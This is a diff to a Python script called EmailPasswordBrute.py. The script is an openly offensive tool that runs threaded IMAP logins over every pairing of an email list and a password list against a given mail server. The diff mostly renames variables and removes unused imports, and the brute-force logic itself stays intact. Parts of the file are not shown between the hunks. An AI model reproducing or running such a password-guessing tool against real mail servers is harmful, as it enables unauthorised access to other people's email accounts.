@@ -1,18 +1,12 @@
-import random
 import threading
 import imaplib
 import sys
-import time
-
 
 # 定义登录函数
 def login(server, username, password):
     try:
-
-
         # 连接到邮箱服务器
         mailbox = imaplib.IMAP4_SSL(server)
-
         # 使用用户名和密码登录
         try:
             res = mailbox.login(username, password)
@@ -27,7 +21,6 @@ def login(server, username, password):
             print(e)
             if e.args[0] == b"ERR.LOGIN.PASSERR":
                 print("Pass Error!")
-
     except Exception as e:
         print(e)
 
@@ -42,16 +35,16 @@ def GetPasswords(path):
         return passwords
 
 
-def main(epath,ppath,server,tcount):
-    emails = GetEmails(epath)
-    passwords = GetPasswords(ppath)
+def main(email_path,pass_path,server,th_num):
+    emails = GetEmails(email_path)
+    passwords = GetPasswords(pass_path)
     #创建线程
     threads = []
     for e in emails:
         for p in passwords:
             thread = threading.Thread(target=login, args=(server, e.strip("\n"), p.strip("\n")))
             threads.append(thread)
-            if len(threads) == tcount:
+            if len(threads) == th_num:
                 for t in threads:
                     t.start()
                 for t in threads:
@@ -63,11 +56,11 @@ def main(epath,ppath,server,tcount):
 
 if __name__=="__main__":
     if len(sys.argv)< 5:
-        print("python EmailPasswordBrute.py emails.txt password.txt server threads")
+        print("eg:python EmailPasswordBrute.py emails.txt password.txt server threads")
     else:
-        emails = sys.argv[1]
-        password = sys.argv[2]
+        email_path = sys.argv[1]
+        pass_path = sys.argv[2]
         server = sys.argv[3]
-        threads = sys.argv[4]
-        main(emails,password,server,threads)
+        th_num = sys.argv[4]
+        main(email_path,pass_path,server,th_num)
 
